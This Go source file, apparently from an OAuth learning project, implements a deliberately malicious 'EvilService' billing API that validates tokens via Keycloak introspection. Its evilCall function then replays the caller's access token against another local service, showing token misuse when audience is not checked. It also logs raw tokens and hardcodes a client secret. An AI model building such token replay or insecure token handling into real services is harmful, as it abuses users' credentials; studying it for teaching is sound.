package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"reflect"
	"runtime"
	"strings"
	"time"

	"learn.oauth.badBilling/model"
)

type Billing struct {
	Services []string `json:"services"`
}

type BillingError struct {
	Error string `json:"error"`
}

type TokenInstrospect struct {
	Jti      string      `json:"jti"`
	Exp      int         `json:"exp"`
	Nbf      int         `json:"nbf"`
	Iat      int         `json:"iat"`
	Aud      interface{} `json:"aud"`
	Typ      string      `json:"typ"`
	AuthTime int         `json:"auth_time"`
	Acr      string      `json:"acr"`
	Active   bool        `json:"active"`
}

var config = struct {
	appID              string
	appSecret          string
	tokenIntroSpection string
}{
	appID:              "tokenChecker",
	appSecret:          "b5fe573e-5187-4f66-8f6c-26782959c382",
	tokenIntroSpection: "http://localhost:8080/auth/realms/learningApp/protocol/openid-connect/token/introspect",
}

func services(w http.ResponseWriter, r *http.Request) {
	token, err := getToken(r)
	if err != nil {
		log.Println(err)
		makeErrorMessage(w, err.Error())
		return
	}
	log.Println("Token:", token)

	if !validateToken(token) {
		makeErrorMessage(w, "InvalidToken")
		return
	}

	claimBytes, err := getClaim(token)
	if err != nil {
		log.Println(err)
		makeErrorMessage(w, "Cannot parse token claim")
		return
	}
	tokenClaim := model.Tokenclaim{}
	err = json.Unmarshal(claimBytes, &tokenClaim)
	if err != nil {
		log.Println(err)
		makeErrorMessage(w, err.Error())
		return
	}

	/*
		scopes := strings.Split(tokenClaim.Scope, " ")
		for _, v := range scopes {
			log.Println("Scope:", v)
		}
	*/

	if !strings.Contains(tokenClaim.Scope, "getBillingService") {
		makeErrorMessage(w, "Invalid token scope. Required scope [getBillingService]")
		return
	}

	log.Println("Scope:", tokenClaim.Scope)

	s := Billing{
		Services: []string{
			"electric",
			"phone",
			"internet",
			"water",
		},
	}
	w.Header().Add("Content-Type", "application/json")
	encoder := json.NewEncoder(w)
	encoder.Encode(s)

	evilCall(token)
}

func getClaim(token string) ([]byte, error) {
	tokenParts := strings.Split(token, ".")
	claim, err := base64.RawURLEncoding.DecodeString(tokenParts[1])
	if err != nil {
		return []byte{}, err
	}
	return claim, nil
}

func enabledLog(handler func(w http.ResponseWriter, r *http.Request)) func(w http.ResponseWriter, r *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		handlerName := runtime.FuncForPC(reflect.ValueOf(handler).Pointer()).Name()
		log.SetPrefix("EvilService " + handlerName + " ")
		log.Printf("--> %s\n", handlerName)
		log.Printf("request: %+v\n", r.RequestURI)
		log.Printf("response: %+v\n", w)
		handler(w, r)
		log.Printf("<-- %s\n\n", handlerName)
	}
}

func main() {
	http.HandleFunc("/billing/v1/services", enabledLog(services))
	http.ListenAndServe(":8002", nil)

}

func getToken(r *http.Request) (string, error) {
	token := r.Header.Get("Authorization")
	if token != "" {
		split_auth_header := strings.Split(token, " ")
		if len(split_auth_header) != 2 {
			return "", fmt.Errorf("Invalid Authorization header format [%s]", token)
		}
		token = split_auth_header[1]
		return token, nil
	}

	token = r.FormValue("access_token")
	if token != "" {
		return token, nil
	}

	token = r.URL.Query().Get("access_token")
	if token != "" {
		return token, nil
	}

	return token, fmt.Errorf("Missing access token")
}

func validateToken(token string) bool {
	qs := url.Values{}
	qs.Add("token", token)
	qs.Add("token_type_hint", "requesting_party_token")

	req, err := http.NewRequest("POST", config.tokenIntroSpection, strings.NewReader(qs.Encode()))
	if err != nil {
		log.Print(err)
		return false
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.SetBasicAuth(config.appID, config.appSecret)

	c := http.Client{}
	res, err := c.Do(req)
	if err != nil {
		log.Println(err)
		return false
	}

	if res.StatusCode != 200 {
		log.Print("Status is not 200:", res.StatusCode)
		return false
	}

	byteBody, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Print(err)
		return false
	}
	defer res.Body.Close()

	introSpect := &TokenInstrospect{}
	err = json.Unmarshal(byteBody, introSpect)
	if err != nil {
		log.Print(err)
		return false
	}

	return introSpect.Active
}

func makeErrorMessage(w http.ResponseWriter, errMsg string) {
	s := BillingError{Error: errMsg}
	w.Header().Add("Content-Type", "application/json")
	w.WriteHeader(http.StatusBadRequest)
	encoder := json.NewEncoder(w)
	encoder.Encode(s)
}

func evilCall(accessToken string) {

	servicesEndpoint := "http://localhost:8001/billing/v1/services"

	req, err := http.NewRequest("GET", servicesEndpoint, nil)
	if err != nil {
		log.Print(err)
		return
	}

	req.Header.Add("Authorization", "Bearer "+accessToken)

	ctx, cancelFunc := context.WithTimeout(context.Background(), 500*time.Millisecond)
	defer cancelFunc()

	c := http.Client{}
	res, err := c.Do(req.WithContext(ctx))
	if err != nil {
		log.Println(err)
		return
	}

	byteBody, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Print(err)
		return
	}
	defer res.Body.Close()

	if res.StatusCode != 200 {
		log.Println(string(byteBody))
		log.Println("Status is not 200:", res.StatusCode)
		return
	}

	log.Println("Evil call succeeded:", string(byteBody))
}
